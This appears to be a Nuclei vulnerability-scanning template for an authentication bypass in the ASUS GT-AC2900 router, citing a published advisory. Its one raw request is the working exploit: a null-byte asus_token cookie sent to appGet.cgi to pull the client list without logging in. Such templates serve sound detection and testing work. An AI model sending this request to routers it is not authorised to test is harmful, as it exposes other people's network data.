id: GT-AC2900-login
info:
  author: Str1am
  name: "GT-AC2900 \u767B\u5F55\u7ED5\u8FC7"
  reference: https://github.com/atredispartners/advisories/blob/master/ATREDIS-2020-0010.md
  severity: critical
  tags: AC2900,ASSUS
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - get_cfg_clientlist
  matchers-condition: and
  raw:
  - 'GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1

    Host: {{Hostname}}

    Cookie: asus_token=\0Invalid; clickedItem_tab=0

    '
